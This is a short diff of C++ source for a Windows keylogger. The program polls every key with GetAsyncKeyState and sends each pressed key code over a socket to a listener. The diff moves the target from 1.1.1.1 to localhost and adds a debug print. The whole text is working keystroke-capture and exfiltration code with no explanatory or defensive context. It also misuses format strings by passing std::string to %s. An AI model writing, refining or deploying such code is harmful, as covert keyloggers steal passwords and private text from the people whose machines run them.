@@ -1,5 +1,4 @@
 #include <Windows.h>
-#include <time.h>
 
 #include "client.h"
 
@@ -15,15 +14,16 @@ int main(int argc, char** argv) {
 
 	char key = 'A';
 	client* connection = new client;
-	connection->initialize("1.1.1.1", 448);
+	connection->initialize("127.0.0.1", 420);
 	while (true) {
 		for (int key = 8; key <= 190; key++) {
 			const auto state
 				= GetAsyncKeyState(key);
 			if (state == -32767) {
-				char keyBuffer[120];
-				sprintf(keyBuffer, "%s|%s\r\n", gmtime(0), std::to_string(state));
+				char keyBuffer[4];
+				snprintf(keyBuffer, 4, "%s", std::to_string(key));
 				send(connection->csocket, keyBuffer, sizeof(keyBuffer), NULL);
+				printf("Send key %i\n", key);
 			}
 		}
 	}
